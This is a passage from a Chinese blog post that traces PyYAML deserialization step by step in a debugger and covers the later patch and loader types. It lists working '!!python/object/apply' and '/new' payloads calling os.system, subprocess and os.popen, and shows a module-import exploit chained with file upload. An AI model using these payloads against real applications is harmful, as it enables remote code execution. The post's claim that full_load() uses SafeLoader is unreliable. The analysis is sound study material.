<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240323184448506.png" alt="image-20240323184448506"></p>
<p>我们重新调试跟进到上方，突然就知道什么鬼了，之前就没注意，这里经过for循环将value给了child，但他的value是</p>
<pre><code class="hljs scss">value=<span class="hljs-selector-attr">[ScalarNode(tag=<span class="hljs-string">'tag:yaml.org,2002:str'</span>, value=<span class="hljs-string">'calc.exe'</span>)]</span>)</code></pre>
<p>当初我还以为是两个value，结果这里是value的嵌套。。。。继续跟进就顿悟了</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240323184625946.png" alt="image-20240323184625946"></p>
<p>如上图，可以看到这里是将child参数值传入给了node，因此这里的node成了上面的值</p>
<p>所以在下图，我们的node也就是之前的child经过处理，又取得他的value值，也就是calc.exe</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240323184747589.png" alt="image-20240323184747589"></p>
<p>这里继续无脑跟进一波</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240323185058636.png" alt="image-20240323185058636"></p>
<p>到达make_python_instance函数，跟进到如下图，发现有调用了find_python_name函数，接续跟进~</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240323185156973.png" alt="image-20240323185156973"></p>
<p>继续跟进，如下图，这里的suffix的值赋给了name，node的start_mark给了mark</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240323185455281.png" alt="image-20240323185455281"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240323190158410.png" alt="image-20240323190158410"></p>
<p>继续跟进，发现对name做了针对处理，首先通过rsplit的.符号将name分隔开，然后通过import导入了os模块，随后判断模块是否在sys的模块中（但很显然是在的）</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240323190713616.png" alt="image-20240323190713616"></p>
<p>最后通过getattr获取os模块里面的system方法</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240323190925079.png" alt="image-20240323190925079"></p>
<p>最后cls的值就是我们的os.system类，最后通过if语句的判断，来决定是通过new来实例化对象还是直接调用类的构造函数来实例化，显然其中的args是calc.exe，且最终是直接调用构造函数来实例化的，至于kwds为空</p>
<p>继续跟进就会发现弹出计算器了，至此分析完毕。</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240323191911886.png" alt="image-20240323191911886"></p>
<p>这里的isinstance函数是来判断cls是否为类对象，但我们最后的cls是os.system是一个函数，显然肯定不会进入if语句，由此可以知道为何apply与new标签的处理方法一致</p>
<h4 id="调试分析2">调试分析2</h4>
<p>这里可以分析剩下的三个标签了，如果你执行会发现没办法进行RCE，我们跟进看看为何</p>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> yaml

payload = <span class="hljs-string">'!!python/object:os.system ["calc.exe"]'</span>
yaml.load(payload, Loader=yaml.Loader)</code></pre>
<p>针对上面代码，我们继续调试跟进到下方，进入make_python函数看看</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240323192750492.png" alt="image-20240323192750492"></p>
<p>进入该函数之前我认为可以与上述的apply、new标签对比一下就知道不同之处了，上述两个成功的标签对了一个对args参数的处理</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240323193432525.png" alt="image-20240323193432525"></p>
<p>如上图所示，这最终会导致args被赋值为calc.exe，但对于name、module标签来说，他们没有对args参数的处理，如果我们跟进会发现如下图的情况，会发现args被默认赋值为了none，导致最终的system没有参数传入，也就无法RCE</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240323193545793.png" alt="image-20240323193545793"></p>
<p>剩下的两个name与object标签都是这样的情况，不再赘述了</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240323193704301.png" alt="image-20240323193704301"></p>
<p>至此全部分析完毕，最终能导致RCE的标签就只有apply、new标签，这里给几个常见payload</p>
<h3 id="payload总结">payload总结</h3>
<pre><code class="hljs scss">poc = '!!python/<span class="hljs-selector-tag">object</span>/new:os.system [<span class="hljs-string">"calc.exe"</span>]<span class="hljs-string">'</span>
<span class="hljs-string">#给出一些相同用法的POC</span>
<span class="hljs-string">#poc = '</span>!!python/object/new:subprocess.check_output [[<span class="hljs-string">"calc.exe"</span>]]<span class="hljs-string">' </span>
<span class="hljs-string">#poc = '</span>!!python/object/new:os.popen [<span class="hljs-string">"calc.exe"</span>]<span class="hljs-string">'</span>
<span class="hljs-string">#poc = '</span>!!python/object/new:subprocess.run [<span class="hljs-string">"calc.exe"</span>]<span class="hljs-string">'</span>
<span class="hljs-string">#poc = '</span>!!python/object/new:subprocess.call [<span class="hljs-string">"calc.exe"</span>]<span class="hljs-string">'</span>
<span class="hljs-string">#poc = '</span>!!python/object/new:subprocess.Popen [<span class="hljs-string">"calc.exe"</span>]<span class="hljs-string">'</span>
<span class="hljs-string">#poc = """!!python/object/new:os.system</span>
<span class="hljs-string">          - calc.exe"""</span>
<span class="hljs-string">#poc = """</span>
<span class="hljs-string">!!python/object/new:os.system</span>
<span class="hljs-string">  args: ["calc.exe"]"""</span>
<span class="hljs-string">//这里将new与apply字符替换即可使用</span></code></pre>
<h2 id="漏洞成因文件上传">漏洞成因–文件上传</h2>
<h3 id="pythonmodule标签">!!python/module标签</h3>
<p>原理：利用现有文件上传或者写文件的功能，传入一个写入命令执行代码的文件；将文件名写入标签中，当该标签被反序列化时，就可以顺利导入该文件作为模块，执行当中的命令</p>
<p>文件名yaml_test.py</p>
<pre><code class="hljs python"><span class="hljs-keyword">import</span> os
os.system(<span class="hljs-string">'calc.exe'</span>)</code></pre>
<p>如果在另一文件simple.py中，依次运行以下load代码</p>
<pre><code class="hljs python"><span class="hljs-keyword">import</span> yaml

yaml.load(<span class="hljs-string">"!!python/module:yaml_test"</span>)
<span class="hljs-comment">#exp方法是随意写的，是不存在的，但必须要有，因为这是命名规则，不然会报错，主要是文件名yaml_test要写对</span>
yaml.load(<span class="hljs-string">"!!python/object:yaml_test.exp"</span> )
yaml.load(<span class="hljs-string">"!!python/name:yaml_test.exp"</span> )</code></pre>
<p>都能成功弹出计算器</p>
<p>当然<code>!!python/object/new</code>和<code>!!python/object/apply</code>也可以用这种方式实现利用</p>
<pre><code class="hljs python">yaml.load(<span class="hljs-string">'!!python/object/apply:yaml_test.exp {}'</span> )
yaml.load(<span class="hljs-string">'!!python/object/new:yaml_test.exp {}'</span> )</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240323195256661.png" alt="image-20240323195256661"></p>
<p>如果我们调试分析就知道最终的name会被赋值为yaml_text，而被import导入，导入之后，其中的代码也会被执行，进而弹出计算器</p>
<p>以上要求是在同一目录下，如果不在同一目录下怎么办，好比如这种情况</p>
<pre><code class="hljs css">├── simple<span class="hljs-selector-class">.py</span>
└── uploads
    └── yaml_test<span class="hljs-selector-class">.py</span></code></pre>
<p>那payload稍作修改，在文件名前加入目录名可</p>
<pre><code class="hljs python"><span class="hljs-comment">#经过测试只有modle标签可行</span>
yaml.load(<span class="hljs-string">"!!python/module:uploads.yaml_test"</span> )</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240323200529942.png" alt="image-20240323200529942"></p>
<p>这里只要调试一下就知道问题出在哪里，在module与name的标签处理中</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240323200802243.png" alt="image-20240323200802243"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240323200939494.png" alt="image-20240323200939494"></p>
<p>对于find_python对应函数的处理中，module标签没有经过rsplit函数的处理，而name经过了</p>
<p>当然文件名写成<code>__init__.py</code>将会更简单，payload只需目录即可，而且apply和new两个标签也可以构造利用了</p>
<pre><code class="hljs scss">yaml<span class="hljs-selector-class">.load</span>("!!python/module:uploads" )
<span class="hljs-selector-id">#exp</span>表示着类实例，可以写成其他，虽不存在但是一定要有，否则报错
yaml<span class="hljs-selector-class">.load</span>('!!python/object/apply:uploads.exp {}' )
yaml<span class="hljs-selector-class">.load</span>('!!python/object/new:uploads.exp {}' )</code></pre>
<h2 id="漏洞修复">漏洞修复</h2>
<p>大于5.1的版本，打了补丁（这里懒得找了，就直接cv文章）</p>
<p>通过调试发现，find_python_name方法（还有find_python_mdule方法也一样）增加了一个默认unsafe为false的值</p>
<p>就无法直接<code>__import__</code>，最终会报错</p>
<pre><code class="hljs py"><span class="hljs-keyword">def</span> <span class="hljs-title function_">find_python_name</span>(<span class="hljs-params">self, name, mark, unsafe=<span class="hljs-literal">False</span></span>):
    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> name:
            <span class="hljs-keyword">raise</span> ConstructorError(<span class="hljs-string">"while constructing a Python object"</span>, mark,
                    <span class="hljs-string">"expected non-empty name appended to the tag"</span>, mark)
        <span class="hljs-keyword">if</span> <span class="hljs-string">u'.'</span> <span class="hljs-keyword">in</span> name:
            module_name, object_name = name.rsplit(<span class="hljs-string">'.'</span>, <span class="hljs-number">1</span>)
        <span class="hljs-keyword">else</span>:
            module_name = <span class="hljs-string">'__builtin__'</span>
            object_name = name
        <span class="hljs-keyword">if</span> unsafe:
            <span class="hljs-keyword">try</span>:
                <span class="hljs-built_in">__import__</span>(module_name)
            <span class="hljs-keyword">except</span> ImportError, exc:
                <span class="hljs-keyword">raise</span> ConstructorError(<span class="hljs-string">"while constructing a Python object"</span>, mark,
                        <span class="hljs-string">"cannot find module %r (%s)"</span> % (module_name.encode(<span class="hljs-string">'utf-8'</span>), exc), mark)
        //这里查看是不是在sys.moudles字典里，不是就会进入直接报错
        <span class="hljs-keyword">if</span> module_name <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> sys.modules:
            <span class="hljs-keyword">raise</span> ConstructorError(<span class="hljs-string">"while constructing a Python object"</span>, mark,
                    <span class="hljs-string">"module %r is not imported"</span> % module_name.encode(<span class="hljs-string">'utf-8'</span>), mark)
        module = sys.modules[module_name]
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">hasattr</span>(module, object_name):
            <span class="hljs-keyword">raise</span> ConstructorError(<span class="hljs-string">"while constructing a Python object"</span>, mark,
                    <span class="hljs-string">"cannot find %r in the module %r"</span> % (object_name.encode(<span class="hljs-string">'utf-8'</span>),
                        module.__name__), mark)
        <span class="hljs-keyword">return</span> <span class="hljs-built_in">getattr</span>(module, object_name)</code></pre>
<p>接下来执行这一段</p>
<pre><code class="hljs py"><span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> (unsafe <span class="hljs-keyword">or</span> <span class="hljs-built_in">isinstance</span>(cls, <span class="hljs-built_in">type</span>) <span class="hljs-keyword">or</span> <span class="hljs-built_in">isinstance</span>(cls, <span class="hljs-built_in">type</span>(self.classobj))):
          <span class="hljs-keyword">raise</span> ConstructorError(<span class="hljs-string">"while constructing a Python instance"</span>, node.start_mark,
                  <span class="hljs-string">"expected a class, but found %r"</span> % <span class="hljs-built_in">type</span>(cls),
                  node.start_mark)</code></pre>
<h2 id="pyyamlgt51">PyYaml&gt;5.1</h2>
<p>在Python的PyYaml库中提供以下方法将python和yaml进行语言格式转换：</p>
<p><strong>load()</strong></p>
<p>在PyYaml&gt;5.1的版本之后，如果要使用load()函数，要跟上一个Loader的参数，否则会报错。(不影响正常输出)</p>
<p>tips：真尴尬，感情我上面分析了半天，用的都是&gt;5.1的版本。。。。但竟然能复现成？？</p>
<p>这里其实和PyYaml&lt;=5.1版本一样，就不多赘述。</p>
<pre><code class="hljs scss"><span class="hljs-built_in">load</span>(data, Loader=yaml.Loader)</code></pre>
<p>这里说明一下PyYaml&gt;5.1都有哪些加载器</p>
<pre><code class="hljs scss">BaseLoader：不支持强制类型转换
SafeLoader：安全地加载 YAML 格式的数据，限制被加载的 YAML 数据中可用的 Python 对象类型，从而防止执行危险的操作或代码。
FullLoader：加载包含任意 Python 对象的 YAML 数据，FullLoader 加载器不会限制被加载的 YAML 数据中可用的 Python 对象类型，因此可以加载包含任意 Python 对象的 YAML 数据。
UnsafeLoader：加载包含任意 Python 对象的 YAML 数据，并且不会对被加载的 YAML 数据中可用的 Python 对象类型进行任何限制。</code></pre>
<p>以SafeLoader为例，示例代码：</p>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> yaml

<span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span>:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name, age</span>):
        self.name = name
        self.age = age

<span class="hljs-keyword">def</span> <span class="hljs-title function_">person_constructor</span>(<span class="hljs-params">loader, node</span>):
    fields = loader.construct_mapping(node, deep=<span class="hljs-literal">True</span>)
    <span class="hljs-keyword">return</span> Person(**fields)

yaml_data = <span class="hljs-string">"""</span>
<span class="hljs-string">- !!python/object:__main__.Person</span>
<span class="hljs-string">  name: Alice</span>
<span class="hljs-string">  age: 25</span>
<span class="hljs-string">- !!python/object:__main__.Person</span>
<span class="hljs-string">  name: Bob</span>
<span class="hljs-string">  age: 30</span>
<span class="hljs-string">"""</span>

yaml.SafeLoader.add_constructor(<span class="hljs-string">'tag:yaml.org,2002:python/object:__main__.Person'</span>, person_constructor)

data = yaml.load(yaml_data, Loader=yaml.SafeLoader)

<span class="hljs-keyword">for</span> person <span class="hljs-keyword">in</span> data:
    <span class="hljs-built_in">print</span>(person.name, person.age)</code></pre>
<p><strong>load_all(data, Loader=yaml.Loader)</strong></p>
<p>以SafeLoader加载器为例，示例代码：</p>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> yaml

<span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span>:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name, age</span>):
        self.name = name
        self.age = age

<span class="hljs-keyword">def</span> <span class="hljs-title function_">person_constructor</span>(<span class="hljs-params">loader, node</span>):
    fields = loader.construct_mapping(node, deep=<span class="hljs-literal">True</span>)
    <span class="hljs-keyword">return</span> Person(**fields)

yaml_data = <span class="hljs-string">"""</span>
<span class="hljs-string"># 第一个文档</span>
<span class="hljs-string">- !!python/object:__main__.Person</span>
<span class="hljs-string">  name: Alice</span>
<span class="hljs-string">  age: 25</span>
<span class="hljs-string"></span>
<span class="hljs-string"># 第二个文档</span>
<span class="hljs-string">- !!python/object:__main__.Person</span>
<span class="hljs-string">  name: Bob</span>
<span class="hljs-string">  age: 30</span>
<span class="hljs-string">"""</span>

yaml.SafeLoader.add_constructor(<span class="hljs-string">'tag:yaml.org,2002:python/object:__main__.Person'</span>, person_constructor)

data = yaml.load_all(yaml_data, Loader=yaml.SafeLoader)

<span class="hljs-keyword">for</span> doc <span class="hljs-keyword">in</span> data:
    <span class="hljs-keyword">for</span> person <span class="hljs-keyword">in</span> doc:
        <span class="hljs-built_in">print</span>(person.name, person.age)</code></pre>
<p>输出结果：</p>
<pre><code class="hljs scss">Alice <span class="hljs-number">25</span>
Bob <span class="hljs-number">30</span></code></pre>
<p>这里其实和load(data, Loader=yaml.Loader)函数一样，就不多赘述了。</p>
<p><strong>full_load(data)</strong></p>
<p>load()与full_load()函数的区别是，full_load()使用<strong>SafeLoader</strong>作为默认解析器。所以说，这是一个相对安全的解析器，它限制了可以执行的Python代码的类型。</p>
<p>示例代码：</p>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> yaml

yaml_data = <span class="hljs-string">"""</span>
<span class="hljs-string">- foo</span>
<span class="hljs-string">- bar</span>
<span class="hljs-string">- baz</span>
<span class="hljs-string">"""</span>

data = yaml.full_load(yaml_data)

<span class="hljs-built_in">print</span>(data)</code></pre>
<p>输出结果：</p>
<pre><code class="hljs scss"><span class="hljs-selector-attr">[<span class="hljs-string">'foo'</span>, <span class="hljs-string">'bar'</span>, <span class="hljs-string">'baz'</span>]</span></code></pre>
<p><strong>full_load_all(data)</strong></p>
<p>full_load_all()与full_load()函数类似，但可以处理包含多个YAML文档的数据流。</p>
<p>示例代码：</p>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> yaml

yaml_data = <span class="hljs-string">"""</span>
<span class="hljs-string">- foo</span>
<span class="hljs-string">- bar</span>
<span class="hljs-string">- baz</span>
<span class="hljs-string">---</span>
<span class="hljs-string">- alice</span>
<span class="hljs-string">- bob</span>
<span class="hljs-string">- charlie</span>
<span class="hljs-string">"""</span>

data = yaml.full_load_all(yaml_data)

<span class="hljs-keyword">for</span> doc <span class="hljs-keyword">in</span> data:
    <span class="hljs-built_in">print</span>(doc)</code></pre>
<p>输出结果：</p>
<pre><code class="hljs scss"><span class="hljs-selector-attr">[<span class="hljs-string">'foo'</span>, <span class="hljs-string">'bar'</span>, <span class="hljs-string">'baz'</span>]</span>
<span class="hljs-selector-attr">[<span class="hljs-string">'alice'</span>, <span class="hljs-string">'bob'</span>, <span class="hljs-string">'charlie'</span>]</span></code></pre>
<p><strong>unsafe_load(data)</strong></p>
<p>unsafe_load()函数可以加载包含自定义Python对象的YAML数据，允许加载和执行任意Python代码，并尝试将它们反序列化为实际的Python对象（存在安全隐患）</p>
<p>示例代码：</p>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> yaml

yaml_data = <span class="hljs-string">"""</span>
<span class="hljs-string">!!python/object:__main__.Person</span>
<span class="hljs-string">name: Alice</span>
<span class="hljs-string">age: 25</span>
<span class="hljs-string">"""</span>

<span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span>:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name, age</span>):
        self.name = name
        self.age = age

data = yaml.unsafe_load(yaml_data)

<span class="hljs-built_in">print</span>(data)</code></pre>
<p>输出结果：</p>
<pre><code class="hljs scss">&lt;__main__<span class="hljs-selector-class">.Person</span> <span class="hljs-selector-tag">object</span> at <span class="hljs-number">0</span>x0000022DA0D36CD0&gt;</code></pre>
<p><strong>unsafe_load_all(data)</strong></p>
<p>相比unsafe_load()，unsafe_load_all()用于将多个YAML文档加载为Python对象的生成器。</p>
<p>示例代码：</p>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> yaml

yaml_data = <span class="hljs-string">"""</span>
<span class="hljs-string">- foo</span>
<span class="hljs-string">- bar</span>
<span class="hljs-string">- baz</span>
<span class="hljs-string">---</span>
<span class="hljs-string">- !!python/object:__main__.Person</span>
<span class="hljs-string">  name: Alice</span>
<span class="hljs-string">  age: 25</span>
<span class="hljs-string">"""</span>

<span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span>:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name, age</span>):
        self.name = name
        self.age = age

data = yaml.unsafe_load_all(yaml_data)

<span class="hljs-keyword">for</span> doc <span class="hljs-keyword">in</span> data:
    <span class="hljs-built_in">print</span>(doc)</code></pre>
<p>输出结果：</p>
<pre><code class="hljs scss"><span class="hljs-selector-attr">[<span class="hljs-string">'foo'</span>, <span class="hljs-string">'bar'</span>, <span class="hljs-string">'baz'</span>]</span>
<span class="hljs-selector-attr">[&lt;__main__.Person object at 0x00000174FFEBD210&gt;]</span></code></pre>
<h3 id="漏洞成因">漏洞成因</h3>
<p>这里的漏洞成因和PyYaml&lt;=5.1一样，都是constructor.py中的一些不严谨的代码引起的漏洞。</p>
<h3 id="漏洞利用">漏洞利用</h3>
<p>我这里选用测试的PyYaml版本是5.1.1版本。</p>
<p>在PyYaml&gt;5.1的版本之后，Fullloader这个加载器对于payload的限制比较多了，我们延用PyYaml的poc还是可以的，只不过要修改一下。</p>
<p>我们还可以利用python内置的builtins模块(因为之前我们审计constructor.py时，发现定义的find_python_name()中，如果不用"."将模块名和对象名分开，会默认调用builtins模块)</p>
<h3 id="pyyamllt51的poc">PyYaml&lt;=5.1的poc</h3>
<pre><code class="hljs scss">from yaml import *
poc= <span class="hljs-selector-tag">b</span>"""!!python/<span class="hljs-selector-tag">object</span>/apply:os.system
- calc<span class="hljs-string">""</span><span class="hljs-string">"</span>
<span class="hljs-string">#subprocess.check_output</span>
<span class="hljs-string">#os.popen</span>
<span class="hljs-string">#subprocess.run</span>
<span class="hljs-string">#subprocess.call</span>
<span class="hljs-string">#subprocess.Popen</span>
<span class="hljs-string"></span>
<span class="hljs-string">yaml.load(poc,Loader=Loader)</span></code></pre>
<h3 id="builtins模块中的内置函数">builtins模块中的内置函数</h3>
<p><code>builtins</code>是python的内建模块，所谓内建模块就是你在使用时不需要<code>import</code>，在python启动后，在没有执行程序员编写的任何代码前，python会加载内建模块中的函数到内存中。</p>
<p>发现在<code>find_python_name</code>处理不带<code>.</code>，也就是module为空的情况下，自动默认module为<code>builtins</code>，并且该模块是在<code>sys.modules</code>中的</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240323205827050.png" alt="image-20240323205827050"></p>
<p>首先，我们先明确builtins中的所有的类，从而筛选出可以利用的类</p>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> builtins

builtin_classes = []
<span class="hljs-keyword">for</span> obj_name <span class="hljs-keyword">in</span> <span class="hljs-built_in">dir</span>(builtins):
    obj = <span class="hljs-built_in">getattr</span>(builtins, obj_name)
    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(obj, <span class="hljs-built_in">type</span>):
        builtin_classes.append(obj)

<span class="hljs-built_in">print</span>(builtin_classes)</code></pre>
